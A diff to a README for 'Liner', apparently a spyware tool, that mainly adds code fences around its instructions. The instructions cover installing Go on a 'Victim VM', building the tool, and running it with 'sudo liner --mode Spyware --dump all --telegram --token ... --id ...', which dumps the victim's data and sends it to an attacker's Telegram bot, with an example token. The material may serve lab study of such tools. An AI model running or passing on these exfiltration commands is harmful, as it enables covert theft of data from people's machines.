@@ -18,28 +18,34 @@ Telegram (optional): A Telegram bot token and chat ID for Telegram-based exfiltr
 1. Install Go 1.24.5 on the Victim VM
 
 Remove any existing Go installations:
+```
 sudo apt remove --purge golang golang-* go
 sudo rm -rf /usr/lib/go* /usr/bin/go /usr/local/go ~/.go ~/go
-
+```
 Install Go 1.24.5:
+```
 wget https://go.dev/dl/go1.24.5.linux-amd64.tar.gz
 sudo tar -C /usr/local -xzf go1.24.5.linux-amd64.tar.gz
-
+```
 Update ~/.bashrc:
+```
 nano ~/.bashrc
-
+```
 Add these lines at the end:
+```
 export PATH=/usr/local/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 export GOROOT=/usr/local/go
 export GOPATH=$HOME/go
 export PATH=$PATH:$GOPATH/bin
-
+```
 Apply changes:
+```
 source ~/.bashrc
-
+```
 Verify Go installation:
+```
 go version
-
+```
 Expected output: go version go1.24.5 linux/amd64.
 
 ---
@@ -47,18 +53,21 @@ Expected output: go version go1.24.5 linux/amd64.
 2. Build Liner on the Victim VM
 
 Navigate to the project directory:
+```
 cd ~/Desktop/liner
-
+```
 Initialize and tidy Go modules:
+```
 rm -rf go.mod go.sum
 go mod init liner
 go mod tidy
-
+```
 Build the tool:
+```
 go build -v -mod=mod -o liner ./cmd
 sudo mv liner /usr/bin
 sudo chmod +x /usr/bin/liner
-
+```
 ---
 
 ### Exfiltration Modes
@@ -70,12 +79,14 @@ Setup Telegram Bot:
 - Get bot token and chat ID.
 
 Run Liner with Telegram:
+```
 sudo liner --mode Spyware --dump all --telegram --token <BOT_TOKEN> --id <CHAT_ID> --encryption no
-
+```
 Example:
+```
 sudo liner --mode Spyware --dump all --telegram --token 123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11 --id 123456789 --encryption no
-
-Check your Telegram chat for received data.
+```
+###### Check your Telegram chat for received data.
 
 ---
 
